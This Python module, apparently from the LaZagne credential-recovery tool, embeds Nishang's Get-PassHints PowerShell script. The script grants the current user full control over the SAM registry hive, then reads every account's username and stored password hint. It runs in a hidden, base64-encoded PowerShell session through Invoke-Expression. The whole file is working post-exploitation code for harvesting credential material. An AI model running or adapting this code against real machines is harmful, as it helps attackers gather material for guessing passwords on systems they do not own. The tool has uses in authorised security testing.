# Thanks to Ninshang for his script
# https://github.com/samratashok/nishang/

import _subprocess as sub
import subprocess
from lazagne.config.moduleInfo import ModuleInfo
from lazagne.config.write_output import print_debug
import base64
import re

class PasswordsHint(ModuleInfo):
	def __init__(self):
		options = {'command': '-p', 'action': 'store_true', 'dest': 'password_hint', 'help': 'retrieve password hint stored on registry'}
		ModuleInfo.__init__(self, 'password_hint', 'windows', options)

	def launch_GetPassHints(self):
		# From https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHints.ps1
		function = 'Get-PassHints'
		script = '''
	function Get-PassHints {
	[CmdletBinding()]
	Param ()
		#Set permissions to allow Access to SAM\SAM\Domains registry hive.
		$rule = New-Object System.Security.AccessControl.RegistryAccessRule (
		[System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
		"FullControl",
		[System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
		[System.Security.AccessControl.PropagationFlags]"None",
		[System.Security.AccessControl.AccessControlType]"Allow")
		$key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
		"SAM\SAM\Domains",
		[Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
		[System.Security.AccessControl.RegistryRights]::ChangePermissions)
		$acl = $key.GetAccessControl()
		$acl.SetAccessRule($rule)
		$key.SetAccessControl($acl)
		#From powerdump from SET
		function Get-UserName([byte[]]$V)
		{
			if (-not $V) {return $null};
			$offset = [BitConverter]::ToInt32($V[0x0c..0x0f],0) + 0xCC;
			$len = [BitConverter]::ToInt32($V[0x10..0x13],0);
			return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
		}
		#Logic for extracting password hint
		$users = Get-ChildItem HKLM:\\SAM\\SAM\\Domains\\Account\\Users\\
		$j = 0
		foreach ($key in $users)
		{
			$value = Get-ItemProperty $key.PSPath
			$j++
			foreach ($hint in $value)
			{
				#Check for users who have passwordhint
				if ($hint.UserPasswordHint)
				{
					$username = Get-UserName($hint.V)
					$passhint = ([text.encoding]::Unicode).GetString($hint.UserPasswordHint)
					Write-Output "$username`:$passhint"
				}
			}
		}
		#Remove the permissions added above.
		$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
		$acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
		Set-Acl HKLM:\SAM\SAM\Domains $acl
	}
		'''
		fullargs=["powershell.exe", "-C", "-"]

		info = subprocess.STARTUPINFO()
		info.dwFlags = sub.STARTF_USESHOWWINDOW | sub.CREATE_NEW_PROCESS_GROUP
		info.wShowWindow = sub.SW_HIDE
		p = subprocess.Popen(fullargs, startupinfo=info, stdin=subprocess.PIPE, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True, shell=True)

		p.stdin.write("$base64=\"\""+"\n")
		n = 25000
		b64_script = base64.b64encode(script)
		tab = [b64_script[i:i+n] for i in range(0, len(b64_script), n)]
		for t in tab:
			p.stdin.write("$base64+=\"%s\"\n" % t)
			p.stdin.flush()

		p.stdin.write("$d=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))\n")
		p.stdin.write("Invoke-Expression $d\n")
	 	
		p.stdin.write("\n$a=Invoke-Expression \"%s\" | Out-String\n" % function)
		p.stdin.write("$b=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(\"$a\"))\n")
		p.stdin.write("Write-Host $b\n")

		# Get the result in base64
		output = ""
		for i in p.stdout.readline():
			output += i
		output = base64.b64decode(output)
		return output

	def run(self, software_name = None):
		pwdFound = []
		
		output = self.launch_GetPassHints()
		output = output.replace('\r', '')

		for res in output.split('\n'):
			if res:
				login, hint = res.split(':', 1)
				pwdFound.append({'Login': login, 'Password Hint': hint})

		return pwdFound